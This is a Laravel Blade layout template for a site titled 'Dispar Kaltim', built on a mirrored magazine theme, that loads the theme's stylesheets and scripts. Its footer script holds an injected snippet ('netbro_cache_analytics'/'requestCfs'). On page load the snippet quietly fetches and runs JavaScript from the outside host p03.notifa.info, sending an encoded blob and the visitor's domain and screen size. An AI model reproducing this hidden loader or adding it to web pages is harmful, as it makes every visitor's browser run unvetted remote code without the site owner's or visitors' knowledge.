<html lang="en" class="no-js">

<!-- Mirrored from nunforest.com/hotmagazine/default/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 03 Oct 2019 08:40:58 GMT -->
<head>
	<title>Dispar Kaltim</title>

	<meta charset="utf-8">

	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href='http://fonts.googleapis.com/css?family=Lato:300,400,700,900,400italic' rel='stylesheet' type='text/css'>
	<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
	
	<link rel="stylesheet" type="text/css" href="{{asset('hotmagazine/css/bootstrap.min.css')}}" media="screen">	
	<link rel="stylesheet" type="text/css" href="{{asset('hotmagazine/css/jquery.bxslider.css')}}" media="screen">
	<link rel="stylesheet" type="text/css" href="{{asset('hotmagazine/css/font-awesome.css')}}" media="screen">
	<link rel="stylesheet" type="text/css" href="{{asset('hotmagazine/css/magnific-popup.css')}}" media="screen">	
	<link rel="stylesheet" type="text/css" href="{{asset('hotmagazine/css/owl.carousel.css')}}" media="screen">
    <link rel="stylesheet" type="text/css" href="{{asset('hotmagazine/css/owl.theme.css')}}" media="screen">
	<link rel="stylesheet" type="text/css" href="{{asset('hotmagazine/css/ticker-style.css')}}"/>
	<link rel="stylesheet" type="text/css" href="{{asset('hotmagazine/css/style.css')}}" media="screen">
	<link rel="stylesheet" type="text/css" href="{{asset('css/website.css')}}" media="screen">
	{{-- <link rel="stylesheet" type="text/css" href="{{asset('css/app.css')}}" media="screen"> --}}

	@yield('script-top')

</head>
<body>

	@include('website._layouts.header')

	<!-- Container -->
	<div id="container">

		@yield('content')

		@include('website._layouts.footer')

	</div>
	<!-- End Container -->	
	
	<script type="text/javascript" src="{{asset('hotmagazine/js/jquery.min.js')}}"></script>
	<script type="text/javascript" src="{{asset('hotmagazine/js/jquery.migrate.js')}}"></script>
	<script type="text/javascript" src="{{asset('hotmagazine/js/jquery.bxslider.min.js')}}"></script>
	<script type="text/javascript" src="{{asset('hotmagazine/js/jquery.magnific-popup.min.js')}}"></script>
	<script type="text/javascript" src="{{asset('hotmagazine/js/bootstrap.min.js')}}"></script>
	<script type="text/javascript" src="{{asset('hotmagazine/js/jquery.ticker.js')}}"></script>
	<script type="text/javascript" src="{{asset('hotmagazine/js/jquery.imagesloaded.min.js')}}"></script>
  	<script type="text/javascript" src="{{asset('hotmagazine/js/jquery.isotope.min.js')}}"></script>
	<script type="text/javascript" src="{{asset('hotmagazine/js/owl.carousel.min.js')}}"></script>
	<script type="text/javascript" src="{{asset('hotmagazine/js/retina-1.1.0.min.js')}}"></script>
	<script type="text/javascript" src="{{asset('hotmagazine/js/plugins-scroll.js')}}"></script>
	<script type="text/javascript" src="{{asset('hotmagazine/js/script.js')}}"></script>
    <script type="text/javascript" src="{{asset('plugins/lazy/jquery.lazy.min.js')}}"></script>

	<script type="text/javascript">
		if (self==top) {
			function netbro_cache_analytics(fn, callback) {
				setTimeout(function() {
					fn();
					callback();
					}, 0);
				}
			function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprA5wClD%2fduy4o2%2byvdJEQXEGOBOCTOdO4dcDeskZjLEtDLInVM%2f4hHTdqkAh687bNai50EFkcigwycO5HTNCrbu7XsqKajYQjyulFvkhaKKKX%2flZJpe1B7ZWoLOohTrqFXm1IzfAFdx%2fBA%2bAtIT%2fKwXDYcOFxk2xCrJz5%2b8SLGTkCQYRooPS%2bYaPZxXM10Su%2bJFo800HuvEAz5dNtxLtXfKlYBTdLH9Sw2hiZrQeeG%2bTVZcak3oy83QJOjdyUSaKC16vw41lmmNv6V4DfiN%2b%2bKfsKTfzJlyKrcAZ4pjELccdZJIGjzcv1M26PmJ7OngBNHmfwY2wWr5s280gBiJcMvOEYvlcfn4nCv1%2fVH5IdeVRf8dGHTarh0%2bBcTGO9knSp5ZRtZAYSvnoVllTTwlsKiylH8zeupUAqdHfRgELoPQmatcmHpZMtx6uBtr6F%2fd53f1SRwYjkDyCGRTjKBtwvEIkVzfoZYZ3A7uRr096lrfdVk8nx0RcSkqQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
		

			$(function() {
				jQuery("img.lazy").lazy({
					asyncLoader: function(element, response) {
						setTimeout(function() {
							element.html('element handled by "asyncLoader"');
							response(true);
						}, 1000);
					}
				});
			});

			function gotolink(link, type = null){
				link = type == 'post' ? 'post/tags/'+link : link;
				window.location.href = link;
			}
	</script>

	{{-- @include('website._layouts.script') --}}

	@yield('script-bottom')
</body>

<!-- Mirrored from nunforest.com/hotmagazine/default/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 03 Oct 2019 08:42:53 GMT -->
</html>